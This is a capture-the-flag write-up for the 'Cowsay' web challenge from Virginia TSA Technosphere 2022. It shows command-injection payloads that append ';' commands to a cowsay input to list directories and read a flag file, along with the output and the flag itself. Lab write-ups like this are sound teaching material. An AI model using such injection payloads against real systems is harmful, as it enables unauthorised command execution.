# Cowsay (150)
#### web - [Virginia TSA Technosphere 2022 CTF](../main.md)

## Challenge description:
> Let your business be cowsay enabled! Enjoy the finest cowsay experience thanks to our revolutionary, and secure API.
>
> [https://vatsa-cowsay.chals.io/](https://vatsa-cowsay.chals.io/)

## Solution
Cowsay is a command, leading me to believe this was a command injection. 

Trying several payloads, eventually `*munches grass* ; ls -la` worked.
```
 _________________ 
< *munches grass* >
 ----------------- 
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
total 24
drwxr-xr-x    1 root     root          4096 Apr 14 16:40 .
drwxr-xr-x    1 root     root          4096 Apr 14 16:46 ..
-rw-r--r--    1 root     root           852 Mar 11 15:33 app.py
drwxr-xr-x    2 root     root          4096 Apr 14 16:40 cowsay
-rw-r--r--    1 root     root           384 Feb 23 12:14 requirements.txt
drwxr-xr-x    2 root     root          4096 Apr 14 16:40 templates
```
Traversing the directory system, I eventually came across the flag with the payload `*munches grass* ; cat ../home/cowsay/flag.txt`

```
 _________________ 
< *munches grass* >
 ----------------- 
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
**********************
```
<details> 
    <summary>Flag</summary>
flag{c0ws4Y_Inj3ct10N}
</details>